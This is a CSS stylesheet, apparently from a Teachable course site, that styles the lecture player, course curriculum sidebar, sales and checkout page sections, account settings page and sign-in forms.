.revamped_lecture_player .ta-container .sidebar { display: inline-block; list-style: none; margin: 0px; float: right; }

.revamped_lecture_player .ta-container .sidebar li { border-left: 1px solid rgb(227, 227, 227); }

.revamped_lecture_player .ta-container .sidebar .unlink { color: red; }

.revamped_lecture_player .ta-auth-modal .form-group { border: 0px; }

.revamped_lecture_player .ta-auth-modal .modal-body { margin: 0px auto; }

.revamped_lecture_player .ta-auth-modal .modal-footer { text-align: center; margin-top: 30px; }

@media screen and (max-width: 915px) {
  .revamped_lecture_player .ta-container .sidebar { display: flex; width: 100%; margin: 0px; padding: 0px; float: none; }
  .revamped_lecture_player .ta-container .profile { border-radius: 0px; }
  .revamped_lecture_player .ta-container .sidebar li { width: 50%; margin: 0px; padding: 0px; border-width: 1px 0px 0px; border-right-style: initial; border-bottom-style: initial; border-left-style: initial; border-right-color: initial; border-bottom-color: initial; border-left-color: initial; border-image: initial; border-top-style: solid; border-top-color: rgb(227, 227, 227); text-align: center; border-radius: 0px; }
  .revamped_lecture_player .ta-container .sidebar li:last-child { padding-left: 1px; }
  .revamped_lecture_player .ta-container .sidebar li:first-child { border-right: 1px solid rgb(227, 227, 227); }
  .revamped_lecture_player .ta-container .single-btn { border-right: 0px; width: 100% !important; }
}

.revamped_lecture_player .lecture-page-layout { display: flex; -webkit-box-orient: horizontal; -webkit-box-direction: normal; flex-direction: row; width: 100%; min-height: unset; height: calc(100vh - 71px); overflow: scroll; }

.revamped_lecture_player .lecture-page-layout .lecture-content .full-width-content { overflow: auto; width: 100%; }

@media screen and (max-width: 767px) {
  .revamped_lecture_player .lecture-page-layout { -webkit-box-orient: vertical; -webkit-box-direction: normal; flex-direction: column; }
}

.revamped_lecture_player header.half-height { z-index: 101; position: sticky; display: flex; -webkit-box-pack: justify; justify-content: space-between; flex-wrap: wrap; }

.revamped_lecture_player header.half-height .nav.navbar-nav > li .fedora-navbar-link:hover { background-color: transparent !important; }

.revamped_lecture_player header.half-height .lecture-left { width: 350px; display: flex; -webkit-box-align: center; align-items: center; -webkit-box-pack: justify; justify-content: space-between; }

.revamped_lecture_player header.half-height .lecture-left .nav-icon-back { width: 50px; padding: 12px; background: none; color: white; text-align: center; height: 71px; display: flex; -webkit-box-orient: vertical; -webkit-box-direction: normal; flex-direction: column; -webkit-box-pack: center; justify-content: center; }

.revamped_lecture_player header.half-height .lecture-left .nav-icon-back:hover { text-decoration: none; color: white; }

.revamped_lecture_player header.half-height .lecture-left .nav-icon-settings, .revamped_lecture_player header.half-height .lecture-left .nav-icon-list { width: 50px; padding: 12px; background: none; color: white; float: right; text-align: center; height: 71px; display: flex; -webkit-box-orient: vertical; -webkit-box-direction: normal; flex-direction: column; -webkit-box-pack: center; justify-content: center; }

.revamped_lecture_player header.half-height .lecture-left .nav-icon-settings.nav-icon-list, .revamped_lecture_player header.half-height .lecture-left .nav-icon-list.nav-icon-list { background: none; }

.revamped_lecture_player header.half-height .lecture-left .nav-icon-settings.nav-icon-list.collapsed, .revamped_lecture_player header.half-height .lecture-left .nav-icon-list.nav-icon-list.collapsed { background: none; }

.revamped_lecture_player header.half-height .lecture-left .nav-icon-settings i, .revamped_lecture_player header.half-height .lecture-left .nav-icon-list i { width: 25px; height: 25px; font-size: 20px; padding-top: 4px; }

.revamped_lecture_player header.half-height .lecture-left .nav-icon-settings:hover, .revamped_lecture_player header.half-height .lecture-left .nav-icon-list:hover { color: white; background: none !important; }

.revamped_lecture_player header.half-height .lecture-left .open .dropdown-toggle { background: none !important; }

.revamped_lecture_player header.half-height .lecture-left .settings-dropdown { float: right; border-right: 1px solid rgb(215, 218, 219); }

.revamped_lecture_player header.half-height .lecture-left .settings-dropdown ul.dropdown-menu { margin-top: 0px; width: 220px; box-shadow: rgba(32, 39, 45, 0.15) 0px 6px 20px; padding: 0px; background-color: var(--white); }

.revamped_lecture_player header.half-height .lecture-left .settings-dropdown ul.dropdown-menu li { padding: 12px 24px; color: var(--black); font-size: var(--fs-1); line-height: var(--lh-1); font-weight: 400; }

.revamped_lecture_player header.half-height .lecture-left .settings-dropdown ul.dropdown-menu li .switch { float: right; color: var(--black); margin-top: 3px; }

.revamped_lecture_player header.half-height .lecture-left .settings-dropdown ul.dropdown-menu li:last-child { border-bottom: 0px; }

.revamped_lecture_player header.half-height .lecture-left .settings-dropdown ul.dropdown-menu li .playback-speed { color: var(--black); background-color: var(--gravel); border: 0px; border-radius: 4px; }

.revamped_lecture_player header.half-height .lecture-left .settings-dropdown ul.dropdown-menu li .playback-speed:hover { background-color: var(--nantucket); cursor: pointer; }

.revamped_lecture_player header.half-height .lecture-nav { display: flex; -webkit-box-align: center; align-items: center; float: right; height: 71px; margin-left: 0px; margin-right: 16px; }

.revamped_lecture_player header.half-height .lecture-nav a.nav-btn { -webkit-box-align: center; align-items: center; color: white; display: flex; -webkit-box-pack: center; justify-content: center; border: 1px solid white; border-radius: 6px; padding: 9px 16px; margin-right: 8px; font-size: var(--fs0); line-height: var(--lh0); font-weight: 600; -webkit-box-flex: 0; flex: 0 0 auto; min-width: max-content; }

.revamped_lecture_player header.half-height .lecture-nav a.nav-btn svg { height: 1.3em; }

.revamped_lecture_player header.half-height .lecture-nav a.nav-btn:hover { color: white; border-color: white; background: none; }

.revamped_lecture_player header.half-height .lecture-nav a.nav-btn.complete { background: rgb(30, 166, 154); color: white; text-decoration: none; }

.revamped_lecture_player header.half-height .lecture-nav a.nav-btn.complete:hover { background: rgb(75, 223, 210); }

.revamped_lecture_player header.half-height .lecture-nav a.nav-btn.disabled { cursor: default; border-color: var(--nantucket); color: var(--nantucket); }

.revamped_lecture_player header.half-height .lecture-nav a.nav-btn.complete.disabled { background: var(--nantucket); color: white; }

@media screen and (min-width: 768px) and (max-width: 991px) {
  .revamped_lecture_player header.half-height .lecture-left { width: 300px; }
}

@media screen and (max-width: 767px) {
  .revamped_lecture_player header.half-height .lecture-left { width: 150px; }
  .revamped_lecture_player header.half-height .lecture-nav .nav-text { display: none; }
  .revamped_lecture_player header.half-height .nav-icon-settings { border-left: 1px solid rgba(215, 218, 219, 0.3); }
  .revamped_lecture_player header.half-height .nav-icon-list { border-left: 0px; }
  .revamped_lecture_player header.half-height a.nav-btn { width: 50%; }
}

.revamped_lecture_player .course-sidebar .course-progress.lecture-page.sticky { position: fixed; top: 36px; z-index: 100; width: 349px; padding-bottom: 0px; transition: background 0.3s ease 0s; border-bottom: 1px solid rgb(215, 218, 219); background: rgba(242, 242, 242, 0.97) !important; }

.revamped_lecture_player .course-sidebar .course-progress.lecture-page.sticky .course-progress-percentage { margin-bottom: 10px; }

.revamped_lecture_player .course-sidebar .row.lecture-sidebar { padding-right: 0px; padding-bottom: 100px; margin-right: 0px !important; }

.revamped_lecture_player .course-sidebar .row.lecture-sidebar .course-section { margin-bottom: 20px; padding-right: 0px; }

.revamped_lecture_player .course-sidebar .row.lecture-sidebar .course-section .section-title { background: var(--white); }

.revamped_lecture_player .course-sidebar .row.lecture-sidebar .course-section .section-item.next-lecture { border-bottom: none !important; }

.revamped_lecture_player .course-sidebar .row.lecture-sidebar .course-section .btn-primary { margin-right: -4px !important; }

.revamped_lecture_player .course-sidebar .row.lecture-sidebar .course-section .title-container { border-left: 1px solid var(--white); padding-right: 0px !important; }

.revamped_lecture_player .course-sidebar.navbar-sidebar-collapse { transition: height 0.5s ease 0s; }

.revamped_lecture_player .course-sidebar.navbar-sidebar-collapse.collapse.in { z-index: 100; display: inline-block; }

.revamped_lecture_player .lecture-content { padding-top: 40px; }

.revamped_lecture_player .lecture-content.course-mainbar { background: rgb(255, 255, 255); -webkit-box-flex: 1; flex-grow: 1; padding: 16px 40px; height: auto; }

.revamped_lecture_player .lecture-content .well.locked { background-color: transparent; border: none; box-shadow: none; }

.revamped_lecture_player .lecture-content .lecture-contents-locked, .revamped_lecture_player .lecture-content .drip-lecture-locked { color: rgb(69, 69, 69); font-size: 22px; font-weight: normal; font-style: normal; font-stretch: normal; line-height: 2.05; text-align: center; }

.revamped_lecture_player .lecture-content .lecture-contents-locked .already-enrolled, .revamped_lecture_player .lecture-content .drip-lecture-locked .already-enrolled { color: rgb(139, 139, 139); font-size: 18px; font-weight: normal; font-style: normal; font-stretch: normal; line-height: 1.67; text-align: center; }

.revamped_lecture_player .lecture-content .lecture-contents-locked .content-available-time, .revamped_lecture_player .lecture-content .drip-lecture-locked .content-available-time { color: rgb(139, 139, 139); font-size: 18px; font-weight: normal; font-style: normal; font-stretch: normal; line-height: 1.67; text-align: center; }

.revamped_lecture_player .lecture-content .lecture-contents-locked a.btn.btn-md.btn-primary, .revamped_lecture_player .lecture-content .drip-lecture-locked a.btn.btn-md.btn-primary { font-stretch: normal; font-style: normal; font-weight: 600; line-height: 0.67; margin-top: 40px; text-align: center; border-radius: 6px; font-size: 18px !important; }

.revamped_lecture_player .lecture-content .drip-lecture-locked { font-size: 28px; color: rgb(140, 140, 140); padding: 100px; }

.revamped_lecture_player .lecture-content .lecture-attachment { margin-bottom: 20px; margin-top: 30px; overflow-wrap: break-word; word-break: break-word; hyphens: auto; }

.revamped_lecture_player .lecture-content .lecture-attachment .attachment { background-color: rgb(247, 247, 247); margin: 0px; font-size: 14px; padding: 6px 13px; line-height: 25px; font-weight: bold; border-bottom: 1px solid rgb(255, 255, 255); }

.revamped_lecture_player .lecture-content .lecture-attachment .attachment .attachment-link { color: rgb(30, 166, 154); cursor: pointer; }

.revamped_lecture_player .lecture-content .lecture-attachment .attachment .attachment-link:hover { color: rgb(22, 123, 114); }

.revamped_lecture_player .lecture-content .lecture-attachment .attachment-block-wrapper { border: 1px solid rgb(215, 218, 218); border-radius: 5px; }

.revamped_lecture_player .lecture-content .lecture-attachment .attachment-block-wrapper .attachment-block-label { background: rgb(43, 54, 54); color: rgb(255, 255, 255); display: block; height: 27px; line-height: 28px; border-radius: 3px; text-align: center; margin-top: -35px; margin-left: -35px; font-weight: bold; font-size: 15px; float: left; padding: 0px 15px; }

.revamped_lecture_player .lecture-content .lecture-attachment .attachment-block-wrapper.quiz-wrapper { padding: 35px 35px 80px; }

.revamped_lecture_player .lecture-content .lecture-attachment .attachment-block-wrapper.comments { padding: 35px; }

.revamped_lecture_player .lecture-content .lecture-attachment .attachment-pdf-embed .label { background-color: rgb(43, 54, 54); font-size: 16px; color: rgb(255, 255, 255); padding: 4px 16px; }

.revamped_lecture_player .lecture-content .lecture-attachment .attachment-pdf-embed .wrapper { border-top: 6px solid rgb(43, 54, 54); border-bottom: 6px solid rgb(43, 54, 54); border-radius: 0px 8px 8px; overflow: hidden; }

.revamped_lecture_player .lecture-content .lecture-attachment .attachment-pdf-embed .wrapper .pdf-viewer { width: 100%; }

.revamped_lecture_player .lecture-content .lecture-attachment .attachment-wistia-player { margin: auto; height: 100%; width: 100%; }

.revamped_lecture_player .lecture-content .lecture-attachment .attachment-title { text-align: left !important; }

.revamped_lecture_player .lecture-content .lecture-attachment .video-options { margin-bottom: 65px; }

.revamped_lecture_player .lecture-content .lecture-attachment .video-options a { float: left; margin-right: 4px; background-color: rgb(247, 247, 247); padding: 10px 16px; cursor: pointer; color: rgb(30, 166, 154); font-weight: bold; font-size: 13px; user-select: none; border-bottom-left-radius: 6px; border-bottom-right-radius: 6px; }

.revamped_lecture_player .lecture-content .lecture-attachment .video-options a:hover { color: rgb(22, 123, 114); text-decoration: none; }

.revamped_lecture_player .lecture-content .lecture-attachment ::-webkit-media-controls { overflow: hidden !important; }

.revamped_lecture_player .lecture-content .lecture-attachment ::-webkit-media-controls-enclosure { width: calc(100% + 32px); margin-left: auto; }

@media screen and (max-width: 992px) {
  .revamped_lecture_player .lecture-content .attachment-block-wrapper.comments { border: 0px !important; padding-right: 10px !important; padding-left: 10px !important; }
}

@media screen and (max-width: 991px) {
  .revamped_lecture_player .lecture-content .lecture-contents-locked, .revamped_lecture_player .lecture-content .drip-lecture-locked { font-size: 16px; padding: 30px 0px; }
  .revamped_lecture_player .lecture-content .drip-lecture-locked { padding: 20px; }
}

.revamped_lecture_player .ql-align-right { text-align: right; }

.revamped_lecture_player .ql-align-center { text-align: center; }

.revamped_lecture_player .wistia_responsive_padding { height: 0px; padding-bottom: 56.25%; position: relative; }

.revamped_lecture_player .wistia_responsive_wrapper { position: absolute; top: 0px; left: 0px; height: 100%; width: 100%; }

.revamped_lecture_player .compliance-banner { background-color: rgb(225, 239, 218); color: rgb(77, 77, 77); font-size: 16px; font-stretch: normal; font-style: normal; font-weight: bold; line-height: normal; padding: 30px; position: relative; width: 100%; }

.revamped_lecture_player .course-section { margin-bottom: 10px; }

.revamped_lecture_player .course-section.course-section-locked .section-lock, .revamped_lecture_player .course-section.progress-locked .section-lock { display: inline; font-size: 16px; }

.revamped_lecture_player .course-section.course-section-locked .title-container .btn-primary, .revamped_lecture_player .course-section.progress-locked .title-container .btn-primary { display: none; }

.revamped_lecture_player .course-section.course-section-locked .section-days-to-drip, .revamped_lecture_player .course-section.progress-locked .section-days-to-drip { display: block; float: right; font-size: 14px; font-weight: 600; margin-top: 1px; }

.revamped_lecture_player .course-section.progress-locked .current-item .title-container .btn-primary { display: block; }

.revamped_lecture_player .course-section .section-lock, .revamped_lecture_player .course-section .section-days-to-drip, .revamped_lecture_player .course-section .section-days-logged-in, .revamped_lecture_player .course-section .section-days-logged-out { display: none; }

.revamped_lecture_player .course-section .section-title { background: var(--white); padding: 10px 16px; margin: 0px; font-size: var(--fs0); line-height: var(--lh0); font-weight: 600; border-bottom: 1px solid rgb(255, 255, 255); }

.revamped_lecture_player .course-section .course-item { background: rgb(247, 247, 247); padding: 10px 16px; margin: 0px; font-size: 17px; font-weight: normal; border-bottom: 1px solid rgb(255, 255, 255); }

.revamped_lecture_player .course-section ul.section-list { margin: 0px; padding: 0px; }

.revamped_lecture_player .course-section ul.section-list .section-item { margin: 0px; padding: 0px; list-style-type: none; border-bottom: 1px solid rgb(255, 255, 255); }

.revamped_lecture_player .course-section ul.section-list .section-item .item { display: flex; -webkit-box-align: center; align-items: center; padding: 0px; background-color: var(--linen); list-style-type: none; font-size: var(--fs-1); line-height: var(--lh-1); font-weight: 400; color: rgb(66, 82, 82); text-decoration: none; }

.revamped_lecture_player .course-section ul.section-list .section-item .item:hover { color: rgb(66, 82, 82); background: rgb(248, 254, 253); }

.revamped_lecture_player .course-section ul.section-list .section-item .item .lecture-icon { padding-right: 8px; display: inline-flex; }

.revamped_lecture_player .course-section ul.section-list .section-item .item .lecture-name { vertical-align: middle; }

.revamped_lecture_player .course-section ul.section-list .section-item .item .btn-primary { margin-top: 0px; margin-right: 0px; }

.revamped_lecture_player .course-section ul.section-list .section-item .status-container { float: left; height: auto; margin: 0px; padding: 16px; }

.revamped_lecture_player .course-section ul.section-list .section-item .title-container { margin: 0px; padding: 10px; width: 100%; }

.revamped_lecture_player .course-section ul.section-list .section-item .status-icon { width: 20px; height: 20px; float: left; border-radius: 14px; }

.revamped_lecture_player .course-section ul.section-list .section-item .lecture-start { opacity: 0.5; }

.revamped_lecture_player .course-section ul.section-list .section-item.completed .item:hover { background-color: rgb(162, 238, 231); }

.revamped_lecture_player .course-section ul.section-list .section-item.completed .item:hover .status-icon { background-color: rgb(30, 166, 154); box-shadow: rgb(30, 166, 154) 0px 0px 0px 2px inset !important; }

.revamped_lecture_player .course-section ul.section-list .section-item.completed .status-icon { background: url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/icons/course-complete.png") 1px 0px / 96% rgb(30, 166, 154); }

.revamped_lecture_player .course-section ul.section-list .section-item.completed .btn-primary { display: none; }

.revamped_lecture_player .course-section ul.section-list .section-item.incomplete .item:hover { background-color: rgb(162, 238, 231); }

.revamped_lecture_player .course-section ul.section-list .section-item.incomplete .status-icon { background: none; box-shadow: rgb(30, 166, 154) 0px 0px 0px 2px inset; }

.revamped_lecture_player .course-section ul.section-list .section-item.next-lecture .item { color: rgb(43, 54, 54); background-color: rgb(162, 238, 231); }

.revamped_lecture_player .course-section ul.section-list .section-item.next-lecture .item:hover .status-icon { background-color: rgb(30, 166, 154); box-shadow: rgb(30, 166, 154) 0px 0px 0px 2px inset !important; }

.revamped_lecture_player .course-section ul.section-list .section-item.next-lecture .status-icon { background: url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/icons/course-incomplete.png") 1px 0px rgb(30, 166, 154); box-shadow: rgb(30, 166, 154) 0px 0px 0px 2px inset; }

.revamped_lecture_player #more_lecture_sections { display: none !important; }

.revamped_lecture_player #more_lecture_sections.collapsed { display: inline-block !important; padding: 5px 12px !important; }

.course-top-row { background-color: rgb(247, 247, 247); padding-bottom: 50px; padding-top: 50px; }

.course-top-row .course-splash-media { margin-right: 10px; margin-bottom: 20px; }

.course-top-row .course-splash-media.video { margin-right: 50px; }

.course-top-row .course-splash-media img { width: 100%; }

@media screen and (max-width: 991px) {
  .course-top-row .course-splash-media { margin-right: 0px; text-align: center; }
  .course-top-row .course-splash-media.video { margin-right: 30px !important; }
}

.course-top-row .course-header-container { padding-top: 10px; }

.course-top-row .course-header-container .course-title { font-weight: bold; line-height: 45px; margin-top: 0px; margin-bottom: 0px; color: rgb(43, 54, 54); }

.course-top-row .course-header-container .course-subtitle { color: rgb(66, 82, 82); margin-top: 10px; margin-bottom: 50px; font-weight: 200; overflow: hidden; font-size: 18px; line-height: 28px !important; }

@media screen and (min-width: 1199px) {
  .course-top-row .course-header-container .course-title { font-size: 38px; }
}

@media screen and (max-width: 1199px) {
  .course-top-row .course-header-container .course-title { font-size: 30px !important; }
  .course-top-row .course-header-container .course-subtitle { min-height: 150px; font-size: 17px !important; margin-bottom: 30px !important; }
  .course-top-row .course-header-container .btn-hg { font-size: 20px !important; }
}

@media screen and (max-width: 991px) {
  .course-top-row .course-header-container { text-align: center; }
}

.course-top-row.has-hero-image { margin-top: -60px; padding-top: 150px; padding-bottom: 50px; position: relative; background-size: cover !important; background-position: center center !important; }

.course-top-row.has-hero-image .course-splash-media { display: none; }

.course-top-row.has-hero-image .course-header-container { padding-top: 10px; width: 100%; text-align: center; margin-bottom: 50px; }

.course-top-row.has-hero-image .course-header-container .course-title { font-weight: bold; color: white; font-size: 49px !important; }

.course-top-row.has-hero-image .course-header-container .course-subtitle { padding-top: 30px; max-width: 750px; margin-top: auto; margin-right: auto; margin-left: auto; color: white; font-size: 34px !important; line-height: 49px !important; margin-bottom: 50px !important; }

.course-top-row.has-hero-image .course-header-container .btn-hg { margin-bottom: 20px !important; }

.course-top-row.has-hero-image .course-header-container form { float: none; margin: auto; display: inline-block; }

.course-top-row.has-hero-image.checkout-top { padding-top: 80px; padding-bottom: 20px; }

.course-top-row .preenrollment-form-wrapper { margin-top: -30px; }

.black-overlay { background: rgb(0, 0, 0); width: 100%; height: 100%; position: absolute; display: block; top: 0px; }

h3.signup-form-title { margin-bottom: 19px; font-weight: bold; opacity: 0.8; margin-top: 0px; color: rgb(255, 255, 255) !important; }

h3.signup-form-title.success { margin-top: 19px; color: rgb(85, 208, 71) !important; }

.preenrollment-form-wrapper { background: rgba(0, 0, 0, 0.3); border-radius: 5px; padding-bottom: 14px; margin-top: 5px; padding-top: 14px; }

.flash-error { text-align: center; color: red; opacity: 0.7; font-weight: bold; font-size: 15px; margin-bottom: 14px; }

.signup-form input[type="text"] { height: 59px; font-size: 18px; padding-left: 20px; margin-bottom: 0px; }

.signup-form .col-sm-4, .signup-form .col-xs-4 { padding-left: 2px; padding-right: 2px; }

.signup-form .btn-primary { width: 100%; box-shadow: none; padding: 13px 20px !important; border-radius: 5px !important; }

@media screen and (max-width: 767px) {
  .course-top-row.has-hero-image .course-header-container .course-title { line-height: 55px; font-size: 49px !important; }
  .course-top-row.has-hero-image .course-header-container .course-subtitle { font-size: 29px !important; line-height: 38px !important; }
}

.description-row, .description_with_share_icons { padding-top: 50px; padding-bottom: 50px; background-color: rgb(255, 255, 255); font-size: 18px; font-weight: 200; line-height: 28px; }

.description-row h2, .description-row h3, .description-row h4, .description-row h5, .description_with_share_icons h2, .description_with_share_icons h3, .description_with_share_icons h4, .description_with_share_icons h5 { font-size: 22px; font-weight: bold; margin-top: 30px; margin-bottom: 25px; }

.description-row h3, .description_with_share_icons h3 { font-size: 18px; }

.description-row h4, .description_with_share_icons h4 { font-size: 16px; }

.description-row h5, .description_with_share_icons h5 { font-size: 14px; }

.description-row ul, .description_with_share_icons ul { margin-bottom: 25px; }

.description-row p, .description_with_share_icons p { font-size: 18px; font-weight: 200; line-height: 28px; margin-bottom: 25px; }

.facebook-button { font-size: 50px; color: rgb(59, 89, 152); }

.twitter-button { font-size: 50px; color: rgb(0, 172, 237); }

.linkedin-button { font-size: 50px; color: rgb(0, 123, 182); }

.instructor-row { padding-top: 50px; padding-bottom: 50px; background-color: rgb(236, 240, 241); }

.instructor-row .instructor-name { font-size: 18px; margin-top: 10px; }

.instructor-row .instructor-title { font-size: 31px; font-weight: bold; }

.instructor-row .author-name { margin-top: 10px; font-size: 18px; font-weight: bold; }

.instructor-row p { font-size: 17px; margin-top: 15px; }

.curriculum-row { padding-top: 50px; background-color: rgb(255, 255, 255); }

.bundled-courses-row { padding-top: 50px; padding-bottom: 50px; background-color: rgb(255, 255, 255); }

.bundled-courses-row h2 { margin-top: 0px; }

.faq-row { padding-top: 50px; padding-bottom: 50px; background-color: rgb(236, 240, 241); }

.faq-row p { font-size: 17px; margin-top: 15px; }

.faq-question { margin: 10px 0px; font-size: 22px; font-weight: bold; padding: 0px; }

.faq-answer { padding-top: 0px; font-weight: 200; font-size: 18px; line-height: 28px; margin-bottom: 30px; }

.closing-letter-row { padding-top: 50px; padding-bottom: 0px; background-color: rgb(255, 255, 255); }

.closing-letter-row h2 { text-align: center; font-weight: bold; }

.closing-letter-row h2.no-products { margin-bottom: 70px; }

.checkout-row { background-color: rgb(255, 255, 255); padding-bottom: 10px; }

.checkout-row h3.signup-form-title { text-align: center; font-weight: bold; font-size: 35px; margin-bottom: 38px; color: rgb(43, 54, 54) !important; }

.checkout-row .flash-error { margin-bottom: 30px; color: darkred; }

.coupon-code-applied { display: none; background: rgba(227, 255, 227, 0.6); font-size: 23px; color: rgb(48, 129, 134); text-align: center; font-weight: bold; padding: 18px; border-top: 1px solid rgba(57, 154, 95, 0.06); border-bottom: 1px solid rgba(57, 154, 95, 0.06); }

.coupon-code-applied small { font-size: 60%; }

.strike-through-price { text-decoration: line-through; font-weight: normal; }

.edit-settings-page .row { margin: 0px; }

.edit-settings-page .link { background: none; border: none; cursor: pointer; }

.edit-settings-page .img-circle { width: 100px; height: 100px; }

.edit-settings-page .ash { color: var(--ash); }

.edit-settings-page .password-container { position: relative; }

.edit-settings-page .icon-profile { position: absolute; top: 6px; right: 10px; opacity: 0.2; }

.edit-settings-page .edit-btn { position: absolute; top: 6px; right: 10px; }

.edit-settings-page .modal-content { border-radius: 0px; }

.edit-settings-page .new-form-group .form-label { color: var(--ash); }

.edit-settings-page .new-form-group .form-label:not(:disabled):focus:not(.error) { border-color: var(--obsidian); }

.edit-settings-page .new-form-group input:disabled { background-color: var(--clinical); }

.edit-settings-page .switchInput { display: block; border-radius: 30px; height: 24px; width: 47px; }

.edit-settings-page .turnedOn { background-color: var(--cornflower-blue); }

.edit-settings-page .turnedOn svg { background: var(--white); color: var(--cornflower-blue); border-radius: 50px; padding: 3.5px; width: 20px; height: 20px; margin-right: 2px; margin-top: 2px; }

.edit-settings-page .turnedOff { background-color: var(--nantucket); }

.edit-settings-page .turnedOff svg { background: var(--white); color: var(--nantucket); border-radius: 50px; padding: 3.5px; width: 20px; height: 20px; margin-left: 2px; margin-top: 2px; }

.edit-settings-page .button { color: var(--clinical); background-color: var(--cornflower-blue); font-weight: 700; font-size: 16px; min-width: 155px; height: 56px; border: none; white-space: nowrap; touch-action: manipulation; transition: opacity 0.3s ease 0s; cursor: pointer; border-radius: 38px !important; }

.edit-settings-page .button:disabled { opacity: 0.4; pointer-events: none; }

.edit-settings-page .button:hover:not(:disabled) { background-color: var(--chefchaouen); }

.edit-settings-page .button-scnd { color: var(--cornflower-blue); background-color: var(--white); font-weight: 700; font-size: 16px; min-width: 155px; height: 56px; transition: opacity 0.3s ease 0s; cursor: pointer; }

.edit-settings-page .button-scnd:disabled { opacity: 0.4; pointer-events: none; }

.edit-settings-page .button-scnd:hover:not(:disabled) { border: 1px solid var(--gravel); border-radius: 38px !important; }

.edit-settings-page .form-group { border-bottom: 1px solid rgb(236, 236, 236); }

.edit-settings-page .form-group:hover { background: rgb(249, 249, 249); }

.edit-settings-page .form-group.no-border { border-bottom: none; }

.edit-settings-page .form-group .boolean-checkbox label { cursor: pointer; padding: 17px 21px 6px; }

.edit-settings-page .form-group .boolean-checkbox input[type="checkbox"] { margin-left: -20px; margin-right: 5px; }

.edit-settings-page .form-group label { font-weight: 300; line-height: 22px; padding: 17px 21px 16px; font-size: 14px; }

.edit-settings-page .form-group .control-input { padding-top: 15px; }

.edit-settings-page .form-group .control-input .form-control { margin-bottom: 16px; }

@media screen and (max-width: 991px) {
  .edit-settings-page .form-group label { line-height: 19px !important; margin-top: 10px !important; }
}

.edit-settings-page .payment-form .card-logos { top: 35px; position: absolute; right: 26px; }

.edit-settings-page .payment-form label { padding: 0px !important; }

.edit-settings-page .payment-form .form-group { padding: 17px 10px; }

.edit-settings-contact { padding: 20px; }

.edit-settings-contact label { font-weight: 500; font-size: 16px; margin: 16px 0px; }

.edit-settings-contact .section-title h1 { margin-bottom: 48px; }

.edit-settings-contact .contact-submit { width: 192px; max-width: 80%; }

.edit-settings-contact form input { height: 50px; }

.edit-settings-contact form textarea { margin-bottom: 24px; }

.edit-settings-contact form textarea::-webkit-input-placeholder { color: rgb(204, 204, 204); }

.edit-settings-contact form textarea::placeholder { color: rgb(204, 204, 204); }

.homepage-hero { padding: 130px 20px 170px; background: rgba(247, 247, 247, 0.95); }

.homepage-hero h2.headline { font-weight: bold; font-size: 49px; }

.homepage-hero h3.subtitle { font-weight: 200; font-size: 23px; margin-top: 25px; }

@media screen and (max-width: 1199px) {
  .homepage-hero h2.heading { font-size: 38px !important; }
  .homepage-hero h3.subtitle { font-size: 20px !important; margin-top: 18px !important; line-height: 27px !important; }
}

h2.homepage-section-title { text-align: center; font-weight: 200; font-size: 31px; padding-bottom: 35px; padding-top: 35px; }

h2.homepage-section-title.contact-us { margin-bottom: 0px; background: rgb(247, 247, 247); font-size: 20px; line-height: 30px; }

.navbar-fedora.is-at-top.is-not-signed-in.hide-nav-background-color { border-bottom: 0px; background: none !important; }

.navbar-fedora.is-at-top.is-not-signed-in.hide-nav-background-color .navbar-brand, .navbar-fedora.is-at-top.is-not-signed-in.hide-nav-background-color a.fedora-navbar-link { color: white !important; }

.navbar-fedora.is-at-top.is-not-signed-in.hide-nav-background-color a.fedora-navbar-link { background: none !important; }

.navbar-fedora.is-at-top.is-not-signed-in.hide-nav-background-color a.fedora-navbar-link:hover { background: none !important; color: rgb(204, 204, 204) !important; }

.homepage-hero { margin-top: -60px; padding-top: 200px; display: block; position: relative; background: rgba(0, 0, 0, 0) !important; }

.homepage-hero::after { content: ""; inset: 0px; position: absolute; z-index: -1; background: url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/images/default-background.jpg") center center / cover !important; }

.homepage-hero h2.headline { color: white; }

.homepage-hero h3.subtitle { color: white; }

.lecture-lock-seal { background-image: url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/icons/star-seal.svg"); display: inline-block; height: 74px; position: relative; width: 74px; }

.lecture-lock-seal .lecture-lock-seal-lock-icon { height: 25px; margin: 32px 0px 0px 26px; position: absolute; transform: rotate(0.0001deg); width: 25px; }

.lecture-lock-seal .lecture-lock-seal-lock-icon::before { border: 2.8px solid rgb(181, 186, 191); border-radius: 41px; content: ""; height: 18px; margin: -8px 0px 0px -7.5px; position: absolute; width: 11px; }

.lecture-lock-seal .lecture-lock-seal-lock-icon .main { background-color: rgb(143, 152, 159); border-radius: 2.8px; height: 15px; position: absolute; width: 21px; }

.lecture-lock-seal .lecture-lock-seal-lock-icon::after { background-color: rgb(211, 215, 220); border-radius: 75.6px; content: ""; height: 4.2px; margin: 6px 0px 0px -3px; position: absolute; width: 2.9px; }

.devise-layout { padding: 75px 0px; }

.devise-layout.enrollment { padding: 20px 0px 50px; }

.devise-layout .content { padding: 30px; background-color: rgb(255, 255, 255); position: static; }

.devise-layout .content .form-wrapper { position: static; }

.devise-layout .content h1 { text-align: center; margin: 0px; padding-bottom: 35px; font-weight: 600; font-size: 26px; }

.devise-layout .content h2 { font-size: 14px; color: rgb(171, 13, 13); margin-top: 0px; font-weight: 600; }

.devise-layout .content ul { margin-bottom: 0px; padding-left: 25px; }

.devise-layout .content ul li { margin-bottom: 8px; opacity: 0.8; }

.devise-layout .content #error_explanation { background: rgb(255, 251, 240); box-shadow: rgb(197, 197, 197) 0px 0px 5px; padding: 20px; border-radius: 5px; margin-bottom: 30px; }

.devise-layout .content .field_with_errors input.form-control { border: 1px solid rgb(228, 168, 168); }

.devise-layout .content input.form-control { padding: 5px 15px; height: 55px; font-size: 18px; font-weight: 200; margin-bottom: 14px; transition: all 0.3s ease 0s; border-radius: 6px; }

.devise-layout .content label.control-label { font-size: 15px; font-weight: 200; color: rgb(43, 54, 54); width: 100%; }

.devise-layout .content select { width: 100% !important; }

.devise-layout .content .form-group { margin-bottom: 10px; width: auto; }

.devise-layout .content .form-group.agree-to-terms { text-align: center; }

.devise-layout .content .well p { font-size: 15px; }

.devise-layout .content .checkbox.checked a { color: rgb(30, 166, 154); }

.devise-layout .content .btn[type="submit"] { margin-top: 5px; }

.devise-layout .content .alert { text-align: center; }

.devise-layout .content .alert-registration-page { text-align: left; }

.devise-layout .content p.text-center { font-size: 15px; }

